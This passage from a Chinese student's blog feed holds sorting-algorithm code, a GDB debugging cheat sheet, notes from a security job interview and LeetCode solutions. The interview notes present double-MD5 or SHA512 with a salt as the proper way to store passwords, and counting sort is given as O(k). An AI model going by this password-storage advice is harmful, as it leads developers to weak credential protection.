class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">Merge</span><span class="hljs-params">(<span class="hljs-type">int</span> sourceArr[],<span class="hljs-type">int</span> tempArr[], <span class="hljs-type">int</span> startIndex, <span class="hljs-type">int</span> midIndex, <span class="hljs-type">int</span> endIndex)</span><br>&#123;<span class="hljs-comment">//合并序列</span><br>    <span class="hljs-type">int</span> i = startIndex, j=midIndex+<span class="hljs-number">1</span>, k = startIndex;<br>    <span class="hljs-keyword">while</span>(i!=midIndex+<span class="hljs-number">1</span> &amp;&amp; j!=endIndex+<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(sourceArr[i] &gt; sourceArr[j])<br>            tempArr[k++] = sourceArr[j++];<br>        <span class="hljs-keyword">else</span><br>            tempArr[k++] = sourceArr[i++];<br>    &#125;<br>    <span class="hljs-keyword">while</span>(i != midIndex+<span class="hljs-number">1</span>)<br>        tempArr[k++] = sourceArr[i++];<br>    <span class="hljs-keyword">while</span>(j != endIndex+<span class="hljs-number">1</span>)<br>        tempArr[k++] = sourceArr[j++];<br>    <span class="hljs-keyword">for</span>(i=startIndex; i&lt;=endIndex; i++)<br>        sourceArr[i] = tempArr[i];<br>&#125;<br> <br><span class="hljs-comment">//内部使用递归</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">MergeSort</span><span class="hljs-params">(<span class="hljs-type">int</span> sourceArr[], <span class="hljs-type">int</span> tempArr[], <span class="hljs-type">int</span> startIndex, <span class="hljs-type">int</span> endIndex)</span><br>&#123;<br>    <span class="hljs-type">int</span> midIndex;<br>    <span class="hljs-keyword">if</span>(startIndex &lt; endIndex)<br>    &#123;<br>        midIndex = startIndex + (endIndex-startIndex) / <span class="hljs-number">2</span>;<br>        MergeSort(sourceArr, tempArr, startIndex, midIndex);<br>        MergeSort(sourceArr, tempArr, midIndex+<span class="hljs-number">1</span>, endIndex);<br>        Merge(sourceArr, tempArr, startIndex, midIndex, endIndex);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="6-快速排序"><a href="#6-快速排序" class="headerlink" title="6.快速排序"></a>6.快速排序</h2><p>快速排序 的基本思想：通过一趟排序将待排记录分隔成独立的两部分，其中一部分记录的关键字均比另一部分的关键字小，则可分别对这两部分记录继续进行排序，以达到整个序列有序。</p><h3 id="6-1算法描述"><a href="#6-1算法描述" class="headerlink" title="6.1算法描述"></a>6.1算法描述</h3><p>快速排序使用分治法来把一个串（list）分为两个子串（sub-lists）。具体算法描述如下：<br>        步骤1：从数列中挑出一个元素，称为 “基准”（pivot ）；<br>        步骤2：重新排序数列，所有元素比基准值小的摆放在基准前面，所有元素比基准值大的摆在基准的后面（相同的数可以到任一边）。在这个分区退出之后，该基准就处于数列的中间位置。这个称为分区（partition）操作；<br>        步骤3：递归地（recursive）把小于基准值元素的子数列和大于基准值元素的子数列排序。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE3LmNuYmxvZ3MuY29tL2Jsb2cvODQ5NTg5LzIwMTcxMC84NDk1ODktMjAxNzEwMTUyMzA5MzYzNzEtMTQxMzUyMzQxMi5naWY"></p><h3 id="6-2代码"><a href="#6-2代码" class="headerlink" title="6.2代码"></a>6.2代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">quickSort</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">partSort</span><span class="hljs-params">(<span class="hljs-type">int</span>[] nums, <span class="hljs-type">int</span> left, <span class="hljs-type">int</span> right)</span>&#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> left, tmp;<br>        <span class="hljs-keyword">while</span> (left &lt; right)&#123;<br>            <span class="hljs-keyword">while</span> (left &lt; right &amp;&amp; nums[right] &gt;= nums[key])&#123;<br>                right--;<br>            &#125;<br>            <span class="hljs-keyword">while</span> (left &lt; right &amp;&amp; nums[left] &lt;= nums[key])&#123;<br>                left++;<br>            &#125;<br>            tmp = nums[left];<br>            nums[left] = nums[right];<br>            nums[right] = tmp;<br>        &#125;<br>        tmp = nums[key];<br>        nums[key] = nums[left];<br>        nums [left] = tmp;<br>        <span class="hljs-keyword">return</span> left;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sort</span><span class="hljs-params">(<span class="hljs-type">int</span>[] nums, <span class="hljs-type">int</span> left, <span class="hljs-type">int</span> right)</span>&#123;<br>        <span class="hljs-keyword">if</span>(right - left &lt;= <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> partSort(nums,left,right);<br>        sort(nums, left, key-<span class="hljs-number">1</span>);<br>        sort(nums,key+<span class="hljs-number">1</span>, right);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(System.in));<br>        <span class="hljs-type">String</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            in = input.readLine();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>        String[] inArr = in.split(<span class="hljs-string">&quot; &quot;</span>);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">cnt</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span>[] nums = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[inArr.length];<br>        <span class="hljs-keyword">for</span>(String s : inArr)&#123;<br>            nums[cnt] = Integer.parseInt(s);<br>            cnt++;<br>        &#125;<br>        sort(nums,<span class="hljs-number">0</span>,nums.length-<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> num:nums)&#123;<br>            System.out.print(num);<br>            System.out.print(<span class="hljs-string">&quot; &quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="7-计数排序"><a href="#7-计数排序" class="headerlink" title="7.计数排序"></a>7.计数排序</h2><h3 id="7-1算法描述"><a href="#7-1算法描述" class="headerlink" title="7.1算法描述"></a>7.1算法描述</h3><p>时间复杂度O（k），空间复杂度O（n + k），k是最大值与最小值差值</p><ol><li>根据待排序集合中最大元素和最小元素的差值范围，申请额外空间；</li><li>遍历待排序集合，将每一个元素出现的次数记录到元素值对应的额外空间内；</li><li>对额外空间内数据进行计算，得出每一个元素的正确位置；</li><li>将待排序集合每一个元素移动到计算得出的正确位置上。</li></ol><p><img src="https://img-blog.csdnimg.cn/20200210211952977.gif"></p>]]></content>
    
    
    
    <tags>
      
      <tag>算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GDB逆向调试分析</title>
    <link href="/blog/2020/03/01/GDB%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/"/>
    <url>/blog/2020/03/01/GDB%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p><strong>最近在学习堆栈溢出漏洞，势必要深入了解一下Linux下GDB工具的使用了。</strong></p><p><img src="/images/fj35.jpg"></p><span id="more"></span><ol><li>disas + 函数名 查看该函数的汇编代码</li><li>info register 查看寄存器信息，可以简写成i r，后面可以跟寄存器名，表示显示该寄存器值</li><li>si、ni   i是指指令instruction，si是步进而且跟踪进入函数内部，ni不会跟踪进入函数，而是继续执行下面的语句。</li><li>p + 变量名 打印变量信息，可以在p后面加控制信息比如&#x2F;f 浮点格式，c字符，t为二进制，o八，x十六，d十进制 a和x同样是打印十六进制,不同名但同功能</li><li>调试运行中的程序：ps -aux | grep execFile    &#x2F;&#x2F;找到运行中的进程PID，然后使用gdb execFile PID   </li><li>backtrace回溯命令，可以简写为bt，n(next)往下走是看不到已经运行完的错误的，所以我们需要回溯</li><li>info + line 可以查看某一行信息，info是查看详细信息的</li><li>run 运行 r+参数是使用相应的参数运行</li><li>quit 退出GDB</li><li>b + * +地址：逆向调试的时候下断点</li><li>x&#x2F;1 可以查看指令 例如x&#x2F;15i main 查看main函数中的第15条指令</li><li>查看帧信息：（1）frame n: 查看第n桢的信息， frame可以用f缩写（2）frame addr: 查看pc地址为addr的桢的相关信息（3）up n: 查看当前桢上面第n桢的信息（4）down n: 查看当前桢下面第n桢的信息 </li><li>（1）info frame、info frame n或者info frame addr查看更详细的帧的信息，（2）info args：查看当前桢中的参数（3）info locals：查看当前桢中的局部变量（4）info catch：查看当前桢中的异常处理器（exception handlers</li><li>查看调用栈信息：（1）backtrace: 显示程序的调用栈信息，可以用bt缩写（2）backtrace n: 显示程序的调用栈信息，只显示栈顶n桢(frame)（3）backtrace –n: 显示程序的调用栈信息，只显示栈底部n桢(frame)（4）set backtrace limit n: 设置bt显示的最大桢层数（5）where, info stack：都是bt的别名，功能一样</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>工具使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>阿里钉钉安全部门面试记录</title>
    <link href="/blog/2020/02/27/%E9%98%BF%E9%87%8C%E9%92%89%E9%92%89%E5%AE%89%E5%85%A8%E9%83%A8%E9%97%A8%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%95/"/>
    <url>/blog/2020/02/27/%E9%98%BF%E9%87%8C%E9%92%89%E9%92%89%E5%AE%89%E5%85%A8%E9%83%A8%E9%97%A8%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p><strong>今天迎来了人生第一次工作面试经历，电话面试，阿里钉钉安全部门主管面试，结果显然不会通过，因为自己没啥准备，也比较菜，阿里的面试也比较难。但是这次经历可以让自己找到差距，了解到了企业想要什么样的，发现自己的基础有多么缺失。</strong></p><p><img src="/images/fj33.jpg"></p><span id="more"></span><h2 id="0x00面试前的流程"><a href="#0x00面试前的流程" class="headerlink" title="0x00面试前的流程"></a>0x00面试前的流程</h2><p>写好简历之后，看到群里有发内推的，就抱着试试看的态度去投看看，本来就没打算过，就是为了想看看实际生产环境需要什么样的知识。简历投递之后稍后就收到了内推学长的回复。第二天面试官就打电话过来说问我第三天有没有时间，效率真的高。</p><h2 id="0x01面试ing"><a href="#0x01面试ing" class="headerlink" title="0x01面试ing"></a>0x01面试ing</h2><p>开始先来了一段自我介绍，没规定时间，自己大概介绍了2分钟吧。</p><p>然后面试官问了一下我的方向和人生规划，如实回答。</p><p>然后面试官让我介绍一下做的项目，我详细的介绍了一下项目，然后面试官就根据我做的项目开始了提问：</p><h4 id="非对称加密签名的原理"><a href="#非对称加密签名的原理" class="headerlink" title="非对称加密签名的原理"></a>非对称加密签名的原理</h4><p>答：私钥加密  公钥验证</p><h4 id="SM2什么加密算法"><a href="#SM2什么加密算法" class="headerlink" title="SM2什么加密算法"></a>SM2什么加密算法</h4><p>答：ECC椭圆曲线算法</p><h4 id="你觉得密码的存储应该怎么做？"><a href="#你觉得密码的存储应该怎么做？" class="headerlink" title="你觉得密码的存储应该怎么做？"></a>你觉得密码的存储应该怎么做？</h4><p>答：用SM3哈希处理之后存储，然后面试官问了一下你了解过业界是怎么做的吗，他提示了我一下加盐。我说加一段随机的字符串后哈希可以提升安全性，他又问为什么可以提升安全性，我没答上来。实际上如果直接hash会遭受查表攻击彩虹表攻击等，不能这么设计，如果随意加盐会造成哈希长度扩展攻击，所以我们可以选用hmac，它通过一个标准算法，在计算哈希的过程中，把key混入计算过程中，可以使程序更安全。其实正确的加盐方式应该如下：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1.</span> MD5(MD5(<span class="hljs-keyword">password</span>)+salt)<br><span class="hljs-number">2.</span> SHA512(SHA512(<span class="hljs-keyword">password</span>)+salt)<br><span class="hljs-number">3.</span> 引入慢哈希: bcrypt(SHA512(<span class="hljs-keyword">password</span>), salt, <span class="hljs-keyword">cost</span>)<br></code></pre></td></tr></table></figure><p>这些方式远比直接加盐哈希安全的多，上课的时候其实是有讲过的，但是当时有点紧张没想起来。</p><h4 id="你了解的双因子认证方式有哪些？"><a href="#你了解的双因子认证方式有哪些？" class="headerlink" title="你了解的双因子认证方式有哪些？"></a>你了解的双因子认证方式有哪些？</h4><p>答：指纹+口令、验证码+口令、面部识别+口令、硬件设备+口令</p><h4 id="硬件设备比如U盾的工作原理是什么？"><a href="#硬件设备比如U盾的工作原理是什么？" class="headerlink" title="硬件设备比如U盾的工作原理是什么？"></a>硬件设备比如U盾的工作原理是什么？</h4><p>答：emmm说实话当时我不知道，真的没了解过这类东西。</p><p>补充：</p><p>基于PKI技术,采用1024位非对称密钥算法对网上数据进行加密、解密和数字签名,确保网上交易的保密性、真实性、完整性和不可否认性。</p><h4 id="你做的这个双因子认证和他们比有什么优点？"><a href="#你做的这个双因子认证和他们比有什么优点？" class="headerlink" title="你做的这个双因子认证和他们比有什么优点？"></a>你做的这个双因子认证和他们比有什么优点？</h4><p>答：emmmm这时候我懵了，其实笔迹识别这种方式无论准确率还是性能貌似都不如指纹识别。然后呢，面试官就说你当时做这个项目的时候没有横向和纵向的了解吗？我说有了解只是相对于非双因子认证的方式，而没有对同为双因子的指纹识别等进行了解。然后面试官给我上了一课emmmm面试官人挺好的。</p><h4 id="WEP的漏洞是什么？原理？"><a href="#WEP的漏洞是什么？原理？" class="headerlink" title="WEP的漏洞是什么？原理？"></a>WEP的漏洞是什么？原理？</h4><p>答：我只知道WEP是不安全的，因为它的IV长度太短可以被猜测，就简单说了一点我知道的emmm</p><h4 id="你知道有什么安全访问策略吗？"><a href="#你知道有什么安全访问策略吗？" class="headerlink" title="你知道有什么安全访问策略吗？"></a>你知道有什么安全访问策略吗？</h4><p>答：比如Linux的安全组策略，对不同的用户进行分组，每一组的用户拥有相同的权限，不同级别的用户拥有不同的权限。</p><h4 id="假如给你一个WEB页面，你应该如何设计安全访问策略？"><a href="#假如给你一个WEB页面，你应该如何设计安全访问策略？" class="headerlink" title="假如给你一个WEB页面，你应该如何设计安全访问策略？"></a>假如给你一个WEB页面，你应该如何设计安全访问策略？</h4><p>答：分组分角色管理，叭叭叭说了一些</p><h4 id="你还有什么想问的吗？"><a href="#你还有什么想问的吗？" class="headerlink" title="你还有什么想问的吗？"></a>你还有什么想问的吗？</h4><p>您觉得我和阿里入职要求还有多大距离？</p><p>需要的层次比较高，本科生一般达不到安全体系设计的要求，要有经验。</p><p>emmm应该是凉了，不过问题不大，找到了差距，知道了生产环境和实验环境的差别，面试官也教会了很多，挺好的，问题不大。</p><h2 id="0x03总结"><a href="#0x03总结" class="headerlink" title="0x03总结"></a>0x03总结</h2><p>整体感觉面试官人很好，很温柔，问的问题也都挺正常的，就是我基础还不够好，以后还要更加努力学习，总之，第一场面试结束了，虽然不是很完美，但是体验还不错，以后等自己水平够了可能就没问题了吧。</p><h2 id="补充学习"><a href="#补充学习" class="headerlink" title="补充学习"></a>补充学习</h2><h3 id="访问控制策略"><a href="#访问控制策略" class="headerlink" title="访问控制策略"></a>访问控制策略</h3><h4 id="自主访问控制"><a href="#自主访问控制" class="headerlink" title="自主访问控制"></a>自主访问控制</h4><p>根据主体的身份及允许访问的权限进行决策；所谓自主是指具有某种访问能能力的主体可以自主地将访问权地某个子集授予其他主体，灵活性比较高，被大量采用。</p><h4 id="强制访问控制"><a href="#强制访问控制" class="headerlink" title="强制访问控制"></a>强制访问控制</h4><p>每个用户及文件都被赋予一定的安全级别，用户不能改变自身或任何客体的安全级别，即不允许单个用户确定访问权限，只有系统管理员可以确定用户和组的访问权限。系统通过比较用户和访问的文件的安全级别来决定用户是否可以访问该文件。</p><h4 id="基于角色的访问控制RBAC"><a href="#基于角色的访问控制RBAC" class="headerlink" title="基于角色的访问控制RBAC"></a>基于角色的访问控制RBAC</h4><p>将访问许可权分配给一定的角色，用户通过饰演不同的角色获得角色所拥有的访问许可权。</p><p>用户与客体无直接联系，他只有通过角色才享有该角色所对应的权限，从而访问相应的客体。因此用户不能自主地将访问权限授给别的用户。</p><p>角色由系统管理员定义，角色成员的增减也只能由系统管理员来执行，即只有系统管理员有权定义和分配角色。</p><h4 id="基于任务的访问控制模型TBAC"><a href="#基于任务的访问控制模型TBAC" class="headerlink" title="基于任务的访问控制模型TBAC"></a>基于任务的访问控制模型TBAC</h4><p>TBAC模型一般用五元组（S，O，P，L，AS）来表示，其中S表示主体，O表示客体，P表示许可，L表示生命期（lifecycle），AS表示授权步。由于任务都是有时效性的，所以在基于任务的访问控制中，用户对于授予他的权限的使用也是有时效性的。</p><p>对象的访问权限控制并不是静止不变的，而是随着执行任务的上下文环境发生变化</p><h4 id="基于对象的访问控制OBAC"><a href="#基于对象的访问控制OBAC" class="headerlink" title="基于对象的访问控制OBAC"></a>基于对象的访问控制OBAC</h4><p>控制策略和控制规则是OBAC访问控制系统的核心所在，在基于受控对象的访问控制模型中，将访问控制列表与受控对象或受控对象的属性相关联，并将访问控制选项设计成为用户、组或角色及其对应权限的集合；同时允许对策略和规则进行重用、继承和派生操作。</p><p>这样，不仅可以对受控对象本身进行访问控制，受控对象的属性也可以进行访问控制，而且派生对象可以继承父对象的访问控制设置</p>]]></content>
    
    
    
    <tags>
      
      <tag>面试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>算法练习-1</title>
    <link href="/blog/2020/02/25/%E7%AE%97%E6%B3%95%E7%BB%83%E4%B9%A0-1/"/>
    <url>/blog/2020/02/25/%E7%AE%97%E6%B3%95%E7%BB%83%E4%B9%A0-1/</url>
    
    <content type="html"><![CDATA[<p><strong>最近几天写算法写的挺开心的，为了以后保研面试啥的，继续准备算法学习工作，在家闲着也是闲着。</strong></p><p><img src="/images/fj32.jpg"></p><span id="more"></span><h2 id="1-复杂链表的复制"><a href="#1-复杂链表的复制" class="headerlink" title="1.复杂链表的复制"></a>1.复杂链表的复制</h2><h3 id="1-1题目描述"><a href="#1-1题目描述" class="headerlink" title="1.1题目描述"></a>1.1题目描述</h3><p>请实现 copyRandomList 函数，复制一个复杂链表。在复杂链表中，每个节点除了有一个 next 指针指向下一个节点，还有一个 random 指针指向链表中的任意节点或者 null。</p><p>来源：<a href="https://leetcode-cn.com/problems/fu-za-lian-biao-de-fu-zhi-lcof">https://leetcode-cn.com/problems/fu-za-lian-biao-de-fu-zhi-lcof</a></p><h3 id="1-2思路分析"><a href="#1-2思路分析" class="headerlink" title="1.2思路分析"></a>1.2思路分析</h3><p>采用深度优先搜索：</p><ul><li>从头结点 head 开始拷贝；</li><li>由于一个结点可能被多个指针指到，因此如果该结点已被拷贝，则不需要重复拷贝；</li><li>如果还没拷贝该结点，则创建一个新的结点进行拷贝，并将拷贝过的结点保存在哈希表中；</li><li>使用递归拷贝所有的 next 结点，再递归拷贝所有的 random 结点。</li></ul><h3 id="1-3代码"><a href="#1-3代码" class="headerlink" title="1.3代码"></a>1.3代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string"># Definition for a Node.</span><br><span class="hljs-string">class Node:</span><br><span class="hljs-string">    def __init__(self, x: int, next: &#x27;Node&#x27; = None, random: &#x27;Node&#x27; = None):</span><br><span class="hljs-string">        self.val = int(x)</span><br><span class="hljs-string">        self.next = next</span><br><span class="hljs-string">        self.random = random</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">copyRandomList</span>(<span class="hljs-params">self, head: <span class="hljs-string">&#x27;Node&#x27;</span></span>) -&gt; <span class="hljs-string">&#x27;Node&#x27;</span>:<br>        <span class="hljs-comment">#递归遍历复制所有节点</span><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">dfs</span>(<span class="hljs-params">head</span>):<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> head: <br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>            <span class="hljs-keyword">if</span> head <span class="hljs-keyword">in</span> visited:<br>                <span class="hljs-keyword">return</span> visited[head]<br>            <span class="hljs-comment"># 创建新结点</span><br>            copy = Node(head.val, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>)<br>            visited[head] = copy<br>            copy.<span class="hljs-built_in">next</span> = dfs(head.<span class="hljs-built_in">next</span>)<br>            copy.random = dfs(head.random)<br>            <span class="hljs-keyword">return</span> copy<br>        visited = &#123;&#125;<br>        <span class="hljs-keyword">return</span> dfs(head)<br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string"># Definition for a Node.</span><br><span class="hljs-string">class Node:</span><br><span class="hljs-string">    def __init__(self, x: int, next: &#x27;Node&#x27; = None, random: &#x27;Node&#x27; = None):</span><br><span class="hljs-string">        self.val = int(x)</span><br><span class="hljs-string">        self.next = next</span><br><span class="hljs-string">        self.random = random</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-comment">#直接调用深度复制deepcopy函数即可</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">copyRandomList</span>(<span class="hljs-params">self, head: <span class="hljs-string">&#x27;Node&#x27;</span></span>) -&gt; <span class="hljs-string">&#x27;Node&#x27;</span>:<br>        <span class="hljs-keyword">return</span> copy.deepcopy(head)<br></code></pre></td></tr></table></figure><h2 id="2-对称二叉树"><a href="#2-对称二叉树" class="headerlink" title="2.对称二叉树"></a>2.对称二叉树</h2><h3 id="2-1题目描述"><a href="#2-1题目描述" class="headerlink" title="2.1题目描述"></a>2.1题目描述</h3><p>给定一个二叉树，检查它是否是镜像对称的。</p><p>例如，二叉树 [1,2,2,3,4,4,3] 是对称的。</p><pre><code class="hljs">1</code></pre><p>   &#x2F; <br>  2   2<br> &#x2F; \ &#x2F; <br>3  4 4  3</p><p>但是下面这个 [1,2,2,null,3,null,3] 则不是镜像对称的:</p><pre><code class="hljs">1</code></pre><p>   &#x2F; <br>  2   2<br>   \   <br>   3    3</p><p>来源：<a href="https://leetcode-cn.com/problems/symmetric-tree">https://leetcode-cn.com/problems/symmetric-tree</a></p><h3 id="2-2思路分析"><a href="#2-2思路分析" class="headerlink" title="2.2思路分析"></a>2.2思路分析</h3><p>首先第一眼就反应到应该用递归操作比较简单，递归结束的条件是探索到叶子节点。</p><p>如果左右叶子都为NULL，证明该节点为叶节点</p><p>对称树要求左边叶子值等于右半部分对应叶子右边的值，于是递归条件就是判断相应的值是不是相等，是否有对应的节点。</p><h3 id="2-3代码"><a href="#2-3代码" class="headerlink" title="2.3代码"></a>2.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for a binary tree node.</span><br><span class="hljs-comment"> * struct TreeNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     struct TreeNode *left;</span><br><span class="hljs-comment"> *     struct TreeNode *right;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-type">bool</span> <span class="hljs-title function_">isMirror</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> TreeNode* l,<span class="hljs-keyword">struct</span> TreeNode* r)</span>&#123;<br>    <span class="hljs-keyword">if</span>(!l&amp;&amp;!r)<span class="hljs-comment">//都为NULL</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">if</span>(!l||!r)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> (l-&gt;val==r-&gt;val)&amp;&amp;isMirror(l-&gt;left,r-&gt;right)&amp;&amp;isMirror(l-&gt;right,r-&gt;left);<br>&#125;<br><span class="hljs-type">bool</span> <span class="hljs-title function_">isSymmetric</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> TreeNode* root)</span>&#123;<br>    <span class="hljs-keyword">return</span> isMirror(root,root);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-寻找旋转排序数组中的最小值"><a href="#3-寻找旋转排序数组中的最小值" class="headerlink" title="3.寻找旋转排序数组中的最小值"></a>3.寻找旋转排序数组中的最小值</h2><h3 id="3-1-题目描述"><a href="#3-1-题目描述" class="headerlink" title="3.1 题目描述"></a>3.1 题目描述</h3><p>假设按照升序排序的数组在预先未知的某个点上进行了旋转。</p><p>( 例如，数组 [0,1,2,4,5,6,7]  可能变为 [4,5,6,7,0,1,2] )。</p><p>请找出其中最小的元素。</p><p>你可以假设数组中不存在重复元素。</p><p>来源：<a href="https://leetcode-cn.com/problems/find-minimum-in-rotated-sorted-array">https://leetcode-cn.com/problems/find-minimum-in-rotated-sorted-array</a></p><h3 id="3-2思路分析"><a href="#3-2思路分析" class="headerlink" title="3.2思路分析"></a>3.2思路分析</h3><p>这个题就是最简单的排序，但是我们要想办法找一个时间复杂度小的算法。</p><p>最简单的直接排序就不说了，有个想法就是找出来旋转的那个点，特征就是前面的数字比后面的数字大，那么后面那个数字一定是最小的。但是要注意边界问题，下面的注释有说明。</p><h3 id="3-3代码"><a href="#3-3代码" class="headerlink" title="3.3代码"></a>3.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 